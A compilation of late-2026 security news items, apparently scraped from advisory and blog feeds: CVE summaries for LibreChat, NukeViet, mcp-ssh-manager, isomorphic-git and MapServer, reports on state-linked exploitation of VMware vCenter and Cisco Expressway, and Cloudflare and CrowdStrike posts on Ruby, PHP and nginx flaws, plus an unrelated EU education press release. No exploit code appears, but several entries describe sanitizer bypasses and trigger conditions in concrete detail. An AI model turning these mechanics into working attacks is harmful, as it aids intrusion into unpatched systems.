title: European Digital Infrastructure Consortium launches today to strengthen digital sovereignty in education
text:
GettyImages © anyaberkut

The new consortium on education brings together Belgium, Croatia, Finland, France, Greece, Slovenia, Spain and the Netherlands, which will be hosting the EDIC.
The initiative will strengthen Europe's technological resilience while making high-quality digital tools accessible to schools, teachers and learners. It will also help narrow the digital divide in education by supporting solutions that can be used across national education systems, regardless of their resources or technological capacity. Today's launch marks an important milestone in fostering innovation and excellence in education and contributing to the EU's technological sovereignty ambitions.
Executive Vice-Presidents Henna Virkkunen and Roxana Mînzatu, together with Judith Tielen, Minister for Primary and Secondary Education of the Netherlands, will welcome the launch.
Henna Virkkunen, Executive Vice-President for Tech Sovereignty, Security and Democracy, said:

“Today's launch of the European Digital Infrastructure Consortium on Education is an important step towards achieving Europe's technological sovereignty in one of our most sensitive and strategic sectors. Education shapes our future, and Europe must be able to rely on trusted, safe and interoperable digital solutions that reflect European values and principles. By working together with the Member States, we can build a resilient European digital education infrastructure that supports learners, educators and schools across the Union.”

Roxana Mînzatu, Executive Vice-President for Social Rights and Skills, Quality Jobs and Preparedness, said:

“Recently, we officially launched the Education and Skills Package and announced the establishment of the EDU-EDIC consortium. Today, we are reiterating our commitment to reinforce education for Europe's future. Our priority is to ensure that education is ready for the AI era. We will work together with Member States to pool expertise in strategic areas such as cloud infrastructure, AI for education, secure data exchange across educational institutions, and Europe's education technology (EdTech) sector.”

You can also read more about other European Digital Infrastructure Consortium (EDIC).

title: CVE-2026-54039 - LibreChat: Pre-registration account takeover via attacker-controlled `provider` field and social-login email fallback
text:
8.1

HIGH
CVSS 3.1

CVE-2026-54039
LibreChat: Pre-registration account takeover via attacker-controlled `provider` field and social-login email fallback

LibreChat is an enhanced ChatGPT clone that supports multiple AI providers. From 0.7.0 until 0.8.6, when local registration is enabled and at least one social provider is configured, POST /api/auth/register passes an unparsed request object into api/server/services/AuthService.js, allowing an unauthenticated attacker to persist a forged provider value for a known victim email. The api/strategies/socialLogin.js email-fallback path then accepts the planted record when the victim signs in because it compares the stored provider name without requiring the provider subject identifier. The victim OAuth session and the attacker local-password session become bound to the same user record, giving the attacker persistent read and write access to data created by the victim. The first-user administrator role is an additional conditional impact only on a fresh deployment. This issue is fixed in version 0.8.6.

title: CVE-2026-134052 - Open Robotics RViz fillIndexBuffer Heap-based Buffer Overflow Remote Code Execution Vulnerability
text:
8.8

HIGH
CVSS 3.0

CVE-2026-134052
Open Robotics RViz fillIndexBuffer Heap-based Buffer Overflow Remote Code Execution Vulnerability

Open Robotics RViz fillIndexBuffer Heap-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Open Robotics RViz. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the handling of mesh resources in PointCloud and Marker displays. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the service account. Was ZDI-CAN-32652.

title: CVE-2026-94598 - NukeViet CMS: Stored XSS via internal marker injection in iframe srcdoc sanitization
text:
8.2

HIGH
CVSS 3.1

CVE-2026-94598
NukeViet CMS: Stored XSS via internal marker injection in iframe srcdoc sanitization

NukeViet CMS is a multi Content Management System. From 4.5.08 until 4.5.12 and 4.6.02, an attacker can place NukeViet's internal {@[, ]@}, [@{, and }@] sanitizer markers in an iframe srcdoc value by encoding square brackets as HTML entities. Recursive NukeViet\Core\Request::filterTags() processing decodes the characters, accepts the forged marker, and later converts it to real markup without normal tag or attribute filtering. Because an unsandboxed srcdoc iframe shares the parent origin and iframe is enabled by default through NV_ALLOWED_HTML_TAGS, stored Contact messages, comments with the editor enabled, or submitted articles can execute JavaScript with the viewer's session. This issue is fixed in versions 4.5.12 and 4.6.02.

title: CVE-2026-94567 - NukeViet CMS: Stored XSS via SVG upload: the sanitizer is blind to markup hidden inside an internal DTD entity
text:
9.3

CRITICAL
CVSS 3.1

CVE-2026-94567
NukeViet CMS: Stored XSS via SVG upload: the sanitizer is blind to markup hidden inside an internal DTD entity

NukeViet CMS is a multi Content Management System. Prior to 4.5.12 and 4.6.02, an attacker with access to an SVG upload flow can hide a script element in an internal DTD entity. NukeViet\Files\Upload::check_svg_tmpfile() loads the document without entity expansion, leaving a DOMEntityReference, and sanitize_svg_dom() inspects only element nodes, while browsers expand the entity when the stored file is served as image/svg+xml. The SVG path also returned before verify_image() and preserved the original bytes, so the hidden script reached disk unchanged. Guest comment attachments make the upload unauthenticated only when a module's comment feature is open to the All or Guest group and allowattachcomm is enabled; module administrators can also use the file manager, allowing same-origin script execution in an administrator's session. This issue is fixed in versions 4.5.12 and 4.6.02.

title: CVE-2026-94565 - NukeViet CMS: Unauthenticated Stored XSS in the Contact module
text:
9.3

CRITICAL
CVSS 3.1

CVE-2026-94565
NukeViet CMS: Unauthenticated Stored XSS in the Contact module

NukeViet CMS is a multi Content Management System. From the 3.x release line until 4.6.01, an unauthenticated visitor can submit a Contact module message containing an event-handler attribute prefixed by a slash. NukeViet\Core\Request::filterTags() tokenizes attributes using only ASCII spaces, so it sees /onerror and misses the ^on denylist, while the browser treats the slash as a separator and activates onerror. The message is stored and rendered without output encoding in the administration panel, which lacks a Content Security Policy, allowing same-origin JavaScript execution when an administrator opens the message. This issue is fixed in version 4.6.01.

CVSS 4.0

CVE-2026-77383
mcp-ssh-manager: Command injection in mcp-ssh-manager database helpers (ssh_db_list / ssh_db_dump / ssh_db_import)

mcp-ssh-manager is an MCP server for managing servers over SSH with human approval, an encrypted vault, and a live audit trail. Prior to 3.6.7, ssh_db_list, ssh_db_dump, ssh_db_import, and ssh_db_restore in src/database-manager.js interpolate caller-controlled database, table, collection, file path, user, host, port, and password values into shell-evaluated command strings without neutralization. The dump and import builders are blocked in readonly mode but remain vulnerable in the default unrestricted mode. The earlier version 3.6.5 hardening covered only ssh_db_query query text; it did not protect the list, dump, import, or restore builders, or the connection flags used by query builders. This issue is fixed in version 3.6.7.

title: CVE-2026-77355 - isomorphic-git: NTFS .git::$INDEX_ALLOCATION alias bypass writes into the active gitdir
text:
8.8

HIGH
CVSS 3.1

CVE-2026-77355
isomorphic-git: NTFS .git::$INDEX_ALLOCATION alias bypass writes into the active gitdir

isomorphic-git is a pure JavaScript implementation of Git for Node.js and browsers. Prior to 1.38.7, tree-entry validation in src/models/GitTree.js does not reject the Windows NTFS reserved pathname alias .git::$INDEX_ALLOCATION. When clone() or checkout materializes an attacker-controlled tree containing this alias on Windows using an NTFS filesystem, the alias resolves to the active .git directory and permits writes to trusted repository metadata instead of a normal worktree directory. A malicious repository or object stream can therefore poison repository configuration, hooks, refs, attributes, or other gitdir state. Strict hosting that rejects hasDotgit objects can block the crafted tree, and non-NTFS systems do not interpret the pathname as the active gitdir. isomorphic-git performs the gitdir write but does not itself execute the written hook or configuration; a later native Git or compatible-tool action, such as processing a poisoned core.fsmonitor value, can execute configured commands as the victim developer or CI identity. This issue is fixed in version 1.38.7.

title: CVE-2026-77347 - Pozeiden: Out-of-bounds read/write (crash / memory corruption) on valid diagrams in grid-layout renderers
text:
8.8

HIGH
CVSS 4.0

CVE-2026-77347
Pozeiden: Out-of-bounds read/write (crash / memory corruption) on valid diagrams in grid-layout renderers

Pozeiden is a MermaidJS renderer written in Zig. Prior to 0.3.0, src/renderers/c4.zig, src/renderers/class.zig, src/renderers/er.zig, and src/renderers/requirement.zig use fixed row-layout arrays while deriving subsequent loop bounds from an untrusted diagram's actual item count, and src/renderers/state.zig indexes a fixed depth array using user-controlled nesting depth. A valid diagram with at least 193 grid items can make the row count exceed the 64-row storage, while a deeply nested state diagram can exceed the col_count depth storage through the public pozeiden.render() path. Safe CLI and ReleaseSafe builds abort the rendering process, enabling reliable denial of service in applications that render untrusted diagrams. ReleaseSmall WASM builds with safety checks disabled instead perform out-of-bounds stack reads or writes, creating a memory-safety violation. This issue is fixed in version 0.3.0.

title: CVE-2026-77326 - MapServer: Heap buffer overflow in WMS GetLegendGraphic via repeated LAYER parameters
text:
8.6

HIGH
CVSS 3.1

CVE-2026-77326
MapServer: Heap buffer overflow in WMS GetLegendGraphic via repeated LAYER parameters

MapServer is a system for developing web-based GIS applications. From 8.2.0 until 8.6.5, an unauthenticated attacker can send a WMS GetLegendGraphic request with a nonempty BBOX and repeated LAYER parameters to trigger a heap buffer overflow in msWMSDispatch() in src/mapwms.cpp. The handler appends synthesized entries to cgiRequestObj.ParamNames and cgiRequestObj.ParamValues at NumParams without retaining the arrays' capacity or reallocating them, while incrementing NumParams inside the loop. Once the parser's hidden capacity is exhausted, the writes pass the heap allocation boundary. A single request can corrupt heap memory and crash the process; code execution may be possible but was not demonstrated. This issue is fixed in version 8.6.5.

title: China's 'Armory Castle' Lays Siege to VMware vCenter Zero-Day
text: Nate Nelson,Contributing WriterNovember 20, 20264 Min ReadSource: Lukas Bischoff via Getty Images Chinese state-sponsored hackers have been using a newly disclosed VMware zero-day vulnerability and an array of custom malware to compromise victims' virtualization stacks for several months.In October, Mandiant described a campaign by China's Armory Castle (formerly UNC5221) to exploit organizations through BeyondTrust's Remote Support tool. The group used a zero-day to breach the edge appliance, then stole credentials and secrets useful for network reconnaissance and downstream compromises within organizations. Exactly what that downstream compromise looked like, though, was unclear at the time.It appears now that BeyondTrust was merely an entrée to a deeper, more interesting, and much more complex campaign. In a follow-up blog post this week, Mandiant researchers described a chained attack beginning with Beyond Trust, moving through obscure Linux appliances, and landing on VMware technologies, at which point the attackers utilized another zero-day and more than half a dozen malware programs to totally undress their targets' virtual machine (VM) environments. That zero-day has only now come to light, months since China first exploited it. In a security advisory, VMware owner Broadcom recommended that customers update their systems. Tracked as CVE-2026-123890, the vulnerability allows for authentication bypass in VMware vCenter, and earned a "critical" 9.8 out of 10 score in the Common Vulnerability Scoring System (CVSS).Armory Castle Exploits VMware vCenter FlawFrom tagged Remote Support boxes, Mandiant observed Armory Castle scanning a victim's internal environment, looking for open ports associated with VMware. Instead of going for the goods immediately, the group established forward operating bases inside of other, possibly unrelated Linux appliances in the same network. These appliances lacked endpoint detection and response (EDR) visibility, allowing the group to establish persistence and stage its malware arsenal away from the parts of the network where defenders were looking. Among other malware, it was there that Armory Castle deployed "Bonesaw," a Go-based remote exploitation tool customized for vCenter.The VMware vCenter Server is the central control plane used to manage multiple VMs and their ESXi hosts. Because it oversees everything else, few technologies are more useful for lateral movement, ransomware attacks, etc. than vCenter is. It's why this summer, the disclosure of two critical vCenter vulnerabilities, CVE-2026-59309 and CVE-2026-59310, caused a stir. While organizations were rushing to patch the two vCenter vulnerabilities known to Broadcom, Armory Castle appears to have had an extra one up its sleeve. In September, it was able to use Bonesaw against a victim that had already patched its vCenter; Bonesaw was tuned to exploit CVE-2026-123890, a flaw that stems from the vCenter login system's use of predictable, time-based UUIDv1 timestamp generation in Secure Remote Password (SRP) authentication handling.Exploiting CVE-2026-123890 afforded Armory Castle a shared session key it could use to create new authenticated sessions as an administrator, bypassing the normal authentication process entirely. Bonesaw then paid more dividends, automating the process of copying vCenter's internal directory database, and creating powerful new accounts for further damage.At this point, Armory Castle had total control over the victim's vCenter. Yet it continued on with machine-like focus; the attackers deployed a tool called "Sawsnake" to turn the Bonesaw-stolen vCenter login-signing key into forged authentication tokens, bypassing multifactor authentication (MFA) and enabling impersonation of any user. It then jumped to ESXi hypervisors, and found and extracted system files.Protecting VMs from Nation-State ThreatsFor high-risk organizations, updating VMware instances to patched versions can't be the end of the story. […]

title: How Cloudflare WAF protects against ruby2shell (CVE-2026-132825)
text: On November 19, 2026, the Ruby team disclosed ruby2shell (CVE-2026-132825), a heap buffer overflow in the way Ruby changes the case of strings. Ruby rates the flaw Critical and says it is aware of proofs of concept that achieve remote code execution in some scenarios. Fixes shipped in Ruby 3.3.14, 3.4.13, and 4.0.10.The reach is wide. Veria Labs reports that Ruby on Rails and classic-style Sinatra applications reach the bug in their default configuration, before any authentication. Self-hosted products that bundle Ruby, including GitLab, GitHub Enterprise Server, Mastodon, OpenProject, Discourse and Chatwoot, shipped an affected Ruby in their latest release at the time of disclosure.Cloudflare WAF blocks ruby2shell for all customers, including those on the Free plan. We have added two rules to both the Cloudflare Free Managed Ruleset and the Cloudflare Managed Ruleset, with Block as the default action: one for ruby2shell and one for GHSA-87fm-7w84-j2px, a related integer overflow in Ruby string case conversion fixed in the same releases.The WAF is a compensating control, not a replacement for patching. Exploits can reach the bug through paths a WAF does not see, and the only complete fix is to upgrade Ruby. Our team continues to monitor attack traffic and will update the rules as new techniques appear. You can track rule changes in the WAF changelog and get the latest on the vulnerability in the Cloudflare Zero Wire briefing.Cloudflare has patched its own systems that use Ruby, and we have found no indication of compromise.Copy linkWhat we know about ruby2shellRuby strings carry an encoding, and Ruby still supports many legacy single-byte encodings, such as ISO-8859-1 (Latin-1) and Windows-1252, alongside UTF-8. In a single-byte encoding each character takes one byte, so changing the case of a string usually produces output of the same length.The German sharp s (ß) breaks that assumption. Its uppercase form is two characters, SS. In 14 ISO-8859 and Windows-125x encodings, Ruby writes those two bytes but checks for room for only one. According to Veria Labs, a string with 21 sharp s characters overflows the output buffer by one byte. The methods that reach the bug are upcase, swapcase, downcase(:fold) and casecmp?. UTF-8 strings take a different code path and are not affected.A one-byte overflow can look harmless. In a memory-corruption exploit, though, a single byte written past the end of a heap buffer can be enough to corrupt an adjacent object or allocator metadata. Ruby says it is aware of proofs of concept that turn this flaw into code execution, and Veria Labs says it will publish its own proof of concept about a week after disclosure. We expect scanning to start soon after.Copy linkWhy default Rails and Sinatra apps are exposedHTML forms can only send GET and POST requests. To simulate PUT, PATCH, or DELETE, many web frameworks accept a _method parameter in a POST request. Rack, the interface most Ruby web frameworks build on, implements this in its MethodOverride middleware, which converts the value of _method to uppercase. Rails includes this middleware by default, and classic-style Sinatra applications enable it. An attacker can send a multipart POST request whose _method part declares a legacy character set and contains a run of sharp s characters. The framework upcases the value while it is still routing the request, before any application code or authentication check runs.Veria Labs reports that other frameworks and plain Rack applications are not exposed by default. Application code that changes the case of strings received in a legacy encoding may still be affected, wherever the string comes from.Copy linkWho is affectedConditionDetailsRuby versionRuby 3.3.13 and earlier, 3.4.0 through 3.4.12, and 4.0.0 through 4.0.9. Veria Labs reports the bug has been present since Ruby 2.4.0. Ruby 3.2 and earlier have reached end of life and will not receive the fix.FrameworkRails and classic-style Sinatra in their default […]

title: How Cloudflare WAF helps protect against phpAfterShell and other critical PHP flaws
text: On November 19, 2026, the security research company depthfirst disclosed phpAfterShell (CVE-2026-126714), a vulnerability in PHP's default file-based session handler that can lead to remote code execution. Under the Common Vulnerability Scoring System (CVSS) 4.0, it scores 9.2 out of 10 (Critical). The PHP project fixed it the same day in versions 8.2.36, 8.3.37, 8.4.28, 8.5.13, and 8.6.0. These releases fix 16 other security vulnerabilities, six of them also rated critical.Cloudflare’s web application firewall (WAF) blocks known phpAfterShell attack patterns, including for customers on the Free plan. The protection comes from a PHP remote code execution rule we first deployed in October 2026 for the php2shell vulnerabilities. That rule already detected part of the phpAfterShell attack pattern before the vulnerability was disclosed, and on November 19 we updated its detection logic to cover phpAfterShell. The rule is part of both the Cloudflare Free Managed Ruleset and the Cloudflare Managed Ruleset, is enabled by default, and its default action is Block.In the same WAF release, we added three new rules to the Cloudflare Managed Ruleset for paid plans: one for a request smuggling flaw in PHP-FPM (CVE-2026-129289), and two for flaws in PHP's SOAP extension (CVE-2026-15353 and CVE-2026-129506) that PHP fixed in the same releases. These rules are enabled by default with the Log action, because the request patterns they look for can also appear in legitimate traffic, and blocking by default could disrupt it. Customers can review matching requests in Security Events now and change the action to Block once they confirm the rules do not affect legitimate traffic.The WAF is an additional layer of defense, not a replacement for the patch. Several of the critical flaws depend on server configuration or can be reached through paths a WAF does not see, and the only complete fix is to upgrade PHP and restart every worker. Our analysts continue to monitor attack activity and will update the rules as new techniques and variations appear. You can track rule changes in the WAF changelog and follow how the vulnerabilities develop in the dedicated Cloudflare Zero Wire briefing.There appears to be no indication so far that these vulnerabilities have been exploited. As of November 19, 2026, none of the 17 vulnerabilities was listed in CISA's Known Exploited Vulnerabilities catalog, and no source we reviewed reports exploitation in the wild.Copy linkWhat we know about phpAfterShellPHP stores session data in files by default. When an application calls session_start(), PHP reads the session file and deserializes its content into the $_SESSION array. When the request ends, PHP writes the updated session back to the same file.phpAfterShell is triggered when that write is interrupted. The session file can then hold the beginning of the new session data followed by the end of the old one. On the next request, session_start() deserializes this mixed content. If an attacker controlled the old data, PHP can end up deserializing objects of the attacker's choice.An attacker trying to exploit the flaw is likely to first search for a way to place controlled data in the session. PHP's advisory names two:Session upload progress, a PHP feature that writes information about a running file upload into the session. A remote client can use it to shape the stored data.Applications that store large user-controlled strings in the session.According to PHP, code execution also requires an interruption at a useful point in the write and a suitable deserialization gadget chain in the application. depthfirst reports that it reached code execution without an application gadget by chaining a second, undisclosed memory-corruption bug in a PHP-native class. The sources we reviewed do not establish whether that second bug is fixed in the November 19 releases.depthfirst says it discovered and reported phpAfterShell. The CVE record credits Leo Lin and Asahi as reporters.Copy […]

title: Linux KVM Flaw CVE-2026-99312 Lets Guest VMs Access Host Memory on AMD Hosts
text:
Linux KVM Flaw CVE-2026-99312 Lets Guest VMs Access Host Memory on AMD HostsSwati KhandelwalNov 20, 2026Vulnerability / Virtualization

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

A flaw in KVM, the hypervisor built into the Linux kernel, let researchers read about 127 GB of a cloud server's memory from inside a virtual machine of their own on DigitalOcean.

On a shared server, that memory can include other customers' virtual machines. The flaw, tracked as CVE-2026-99312, affects only hosts with AMD processors and nested virtualization enabled.

Fixed kernels shipped upstream on Tuesday, the day before the research went public. The provider patched its own fleet with a live patch, telling Droplet customers: "No action needed on your part." Operators who run their own KVM hosts on AMD hardware need to update the host kernel or turn nested virtualization off.

Oren Yomtov, a researcher at the security firm Terra Security, found the flaw and reported it through the provider's bug bounty program. The provider confirmed the exploit worked on its own hosts and treated it as critical, and the Linux KVM maintainers, told on October 21, merged a fix on November 2.

In the test on one of its Droplets, the first thing to come back was the host's kernel version banner, followed by about 127 GB of the host's RAM, mapped read-only, the provider said in a disclosure post yesterday.

The write test ran on the researchers' own bare-metal AMD server, with no other customers attached. There, the guest wrote 32 chosen bytes into a live page of the host kernel's memory, and a witness module loaded into that kernel confirmed the change.

Both tests started with root access inside a VM controlled by the researchers. An attacker would need the same position: control of a guest on a vulnerable host, not just network access to it.

Intel-based KVM hosts are not affected, because the vulnerable code exists only in KVM's support for nested virtualization on AMD. Many cloud providers the researchers surveyed were not vulnerable because they had not enabled nested virtualization on AMD.

There are no reports of the flaw being used outside research, according to VirtFusion, a virtualization platform vendor that is tracking the issue for its operators. No exploit code has been published either, and no guidance exists for detecting a past attempt.

Severity ratings disagree. The Linux kernel's CVE team scores the flaw 8.8 out of 10, with high impact on confidentiality, integrity, and availability, while Red Hat's preliminary security assessment rates it as Moderate at 5.6 and treats the impact as denial-of-service only. The provider treated it as critical for its own shared cloud.

Terra's technical analysis, published on Wednesday, describes a pointer left pointing at freed memory. KVM confines each VM with a table, the nested page table, that translates the VM's memory addresses into the host's real memory, and the processor finds that table through a pointer kept for each virtual CPU.

Some hosts let a VM run a VM of its own, a nested VM. When a reset signal called INIT stops the nested VM, KVM skips restoring the outer VM's pointer, leaving it pointing to a page of memory the kernel has already freed.

Once the kernel reused that freed page, the guest could fill it with entries of its own choosing, and the processor followed them as if they were the real table. The forged entries could name any physical page on the host, which is how about 127 GB of the server's RAM came into reach of a guest that was never given it.

The fix makes KVM reset that memory-management state on every INIT.

The flaw was created by a security fix. A 2022 patch for a different nested-virtualization bug, CVE-2022-3344, switched a reset path back to the outer VM's control block but missed the page-table pointer, the […]

title: Hackers Exploit Critical Cisco Expressway Flaw, Breach Four Devices and Reach Internal Network
text:
Hackers Exploit Critical Cisco Expressway Flaw, Breach Four Devices and Reach Internal NetworkRavie LakshmananNov 20, 2026Vulnerability / Network Security

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

Threat actors have been observed exploiting a recently disclosed critical security flaw in Cisco Expressway to breach a Russian organization shortly after the public release of a proof-of-concept (PoC) exploit.

The activity involves the exploitation of CVE-2026-76466 (CVSS score: 9.8), a vulnerability that could allow an unauthenticated, remote attacker with network access to a Cisco Expressway device to execute arbitrary operating system commands as root.

"This vulnerability is due to the use of persistent cookies," Cisco said in an advisory released late last month. "Additionally, there is insufficient validation of client certificates when the TLS Verify Mode is set to Enabled for clustering, which means that client certificates are not validated."

"An attacker with possession of the cookies could exploit this vulnerability by connecting to the database service and invoking specific remote procedure call (RPC) commands. A successful exploit could allow the attacker to execute arbitrary commands as root on the underlying operating system of an affected device."

Patches for the flaw were released in the following versions on October 21, 2026 -

Cisco Expressway Series Release X14 and earlier - Migrate to a fixed release
Cisco Expressway Series Release X15.5.3 and earlier - X15.5.20

In a report published Thursday, Russian cybersecurity company F6 said it observed what appears to be the first case of in-the-wild exploitation of the flaw to gain remote command execution on compromised Cisco Expressway X15.5.3 devices with root privileges after a PoC exploit became publicly available.

"The attackers initially compromised two Cisco Expressway internet-facing devices," F6 said. "Through one of them, they gained access to two additional cluster nodes located on the organization's internal network."

Following root access, the attackers are said to have undertaken efforts to move laterally across the network and use custom Python scripts to scan the network, discover accessible SMB resources, interact with SQL Server and WinRM, and access GitLab repositories in order to exfiltrate credentials and other sensitive data.

Analysis of the scripts indicates that they were possibly developed with assistance from artificial intelligence (AI) tools, given the presence of comments and descriptions of fixes.

The company has shared the following indicators of compromise (IoCs) associated with the activity -

IP addresses geolocated: 66.179.31[.]32 and 18.130.47[.]116
Presence of "wombat@127.0.0.1" in the Erlang system log (erlang.log) on affected Cisco Expressway devices
Python scripts staged in "/mnt/harddisk/i{0-9}{4}[a-zA-Z]?/*.py"

The attack has not been attributed to any known threat actor or group. Users are advised to update to the latest supported version of Cisco Expressway, audit environments for signs of compromise, isolate affected systems, determine the scope of the attack, and block potential lateral movement vectors.

"This incident demonstrates that compromise of a perimeter device can open a path for an attacker to an organization's critical systems," F6 said. "That means protection should therefore include not only timely vulnerability remediation but also properly configured segmentation and infrastructure monitoring."

text:
China-Linked Hackers Exploit Critical VMware vCenter Zero-Day to Gain Admin Access and Steal DataRavie LakshmananNov 20, 2026Vulnerability / Cyber Espionage

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

The suspected China-nexus cyber espionage group known as Armory Castle (formerly UNC5221) has been attributed to the zero-day exploitation of a critical security flaw in VMware vCenter Server in early September 2026.

The vulnerability, tracked as CVE-2026-123890 (CVSS score: 9.8), is a case of authentication bypass in the VMware Directory Service that could be exploited to gain unauthorized access to the system.

It has been addressed as part of patches released on November 19, 2026, in the following versions -

VMware Cloud Foundation, VMware vSphere Foundation 9.1.x.x - Fixed in 9.1.1.0200
VMware Cloud Foundation, VMware vSphere Foundation 9.0.x.x - Fixed in 9.0.2.0200
VMware vCenter 8.0 - Fixed in 8.0 U3m
VMware vCenter 7.0 (Contact Broadcom Support, if on extended support contract)
VMware Cloud Foundation - Fixed in 5.2.5
VMware Telco Cloud Platform - Fixed in vCenter 8.0 U3m (TCI: 3.0, TCP: 3.0, 4.x, 5.0.x, 5.1.x, 5.2)
VMware Telco Cloud Infrastructure - Fixed in vCenter 8.0 U3m (TCI: 3.0, TCP: 3.0, 4.x, 5.0.x, 5.1.x, 5.2)

"CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC)," Google Threat Intelligence Group and Mandiant said.

"Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local."

An attacker can exploit the vulnerability to obtain an authenticated administrator session, execute arbitrary commands, and acquire files, such as the data.mdb database, by using the Directory Service ("vmdird"). The tech giant's threat intelligence and incident response teams said it observed the Chinese hacking group weaponizing the flaw using a utility dubbed BONESAW.

"BONESAW is a utility primarily built to facilitate remote exploitation written in Golang, which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account," Google said.

The activity is part of the same campaign that also involved the exploitation of a then zero-day vulnerability in BeyondTrust Remote Support (CVE-2026-102764, CVSS score: 9.3) to conduct reconnaissance, obtain administrative control, establish persistence, and deploy a bespoke proxy tunneler called BARECLAW.

From the Remote Support device, the threat actor is said to have moved laterally to an internal Linux appliance, escalated privileges to root, and deployed additional payloads to broaden their access, map the environment, conduct data theft, and move into the virtualized environment.

"The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012," Google said. "Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of Armory Castle's remote exploitation of CVE-2026-123890 through BONESAW."

Deployed as part of the attack are six identified malware families and utilities -

SLIMSAVAGE and CAGEMATCH, JSP web shells designed to run arbitrary commands, stage payloads, and establish a foothold on the Linux appliance.
BONESAW, the Golang-based remote exploitation utility for CVE-2026-123890 used to target an internal vCenter Server.

title: nginx2root: Five new nginx vulnerabilities, and how Cloudflare protects origins from the worst of them
text: On November 18, 2026, F5 and nginx.org disclosed ten vulnerabilities in nginx. Five of them, detailed by the Xint research team and published under the name nginx2root, are memory corruption flaws that an unauthenticated attacker can use to crash an nginx worker or, per Xint's research, run commands on the server. Xint also found a Linux kernel bug that turns that foothold into root on the host, including from inside a Docker container. Other teams found the two HTTP/2 bugs independently: F5 also credits Rapid7, Wiz Research and Ikotas Labs for CVE-2026-123007, and Metnir, Wiz Research, and Palo Alto Networks Unit 42 for CVE-2026-123633.nginx is an HTTP web server that also serves as reverse proxy, content cache, load balancer, TCP/UDP proxy server, and mail proxy server. nginx runs a large share of the world's web servers, so this is a patch-now event. But if your nginx server is reachable only through Cloudflare's proxy, attackers cannot reach the vulnerable code paths for the most serious of these bugs, giving you protection while you update your servers.Here is where Cloudflare stands, what that protection covers, where it stops, and how the bugs work.Copy linkThe short versionCloudflare's edge is not affected. Much of the proxy that handles customer traffic at our edge now runs on FL2, written in Rust. We reviewed the parts still built on our heavily modified nginx fork against all five bugs before disclosure, and an update closing the related code paths finished rolling out globally before the vulnerabilities were published. The same releases fix five other nginx CVEs, including CVE-2026-118899, an infinite loop while reading a request body over TLS 1.3.Origins behind Cloudflare's HTTP proxy are shielded from the HTTP/2 and HTTP/3 attacks. For proxied hostnames, Cloudflare terminates every client HTTP/2 and HTTP/3 connection at our edge and opens a separate connection to your origin. The attacker's frames never reach your nginx.The resolver and mail proxy vulnerabilities depend on specific configuration. Many configurations of nginx will not be vulnerable, but the safest way to be sure is to update your install or disable features.You should still patch. Update to nginx 1.30.7 or 1.31.9 (or your vendor's fixed build) and restart. Some configurations, covered below, are not protected by the proxy.Copy linkWhat was disclosednginx2root is five independent bugs. Each one works on its own and each one needs a different configuration.CVEBug classAffected configurationFirst affected releaseCVE-2026-123007Integer overflow leading to out-of-bounds heap read/writeHTTP/2 enabled1.9.5 (2015)CVE-2026-123633Use-after-freeHTTP/2 with proxy_pass to a backend, worker low on worker_connections1.19.7CVE-2026-121810Use-after-freeHTTP/3 (QUIC) with proxy_pass to a backend1.25.0CVE-2026-123634Use-after-freeresolver + proxy_pass with variables + a subrequest (mirror or SSI)0.6.18CVE-2026-113425Use-after-freeMail proxy with proxy on and auth_http0.5.33F5 rates each one High (CVSS 3.1: 8.1) and Critical (CVSS 4.0: 9.2), and notes that code execution requires disabling or bypassing ASLR (Address Space Layout Randomization). For CVE-2026-123007, Xint's write-up shows how it leaked memory addresses to do exactly that.CVE-2026-123007 is the one to worry about most. It only needs HTTP/2 turned on, which is commonly enabled on TLS deployments, and it has been in every nginx release since HTTP/2 support shipped in 1.9.5. Xint ran the exploit over the public Internet against servers on AWS, GCP and Azure. Xint searched Shodan on November 10, before the disclosure, and found 56.7 million hosts matching product:nginx. Of the 11.94 million that reported a version, 98.9% fell in the affected range. As of November 19, Censys's nginx2root exposure tracker counts about 8.8 million services running a potentially affected version with HTTP/2 enabled. text:
NGINX2Root: Identify and Protect with the CrowdStrike Falcon Platform
NGINX2Root refers to five nginx vulnerabilities, including CVE-2026-123007, that each allow remote code execution, and a separate Linux kernel flaw that can be chained with them to gain root.

A set of five critical vulnerabilities in nginx, one of the most widely deployed open-source web servers, was disclosed on November 18, 2026. 
Collectively branded NGINX2Root by researchers, these flaws allow an unauthenticated remote attacker to execute code on a target host and, in a demonstrated exploit chain, escalate to root and escape a Docker container to reach the underlying host. The two most severe CVEs (CVE-2026-123007 and CVE-2026-123633) each carry a CVSS 4.0 score of 9.2. F5 and the nginx project released patches the same day.
This post explains who is affected, what organizations should do now, and how the CrowdStrike Falcon® platform helps identify exposed assets and detect post-exploitation activity.

NGINX2Root is the name researchers gave to five nginx vulnerabilities that each allow remote code execution, plus a separate Linux kernel flaw that can be chained with them to gain root. The headline flaw is CVE-2026-123007, an integer underflow in nginx’s HTTP/2 request-handling code. HTTP/2 is the modern web protocol enabled by default in most production nginx deployments. When an attacker sends specially crafted HTTP/2 traffic, the flaw corrupts memory inside the nginx worker process and allows arbitrary command execution with no authentication or user interaction required.
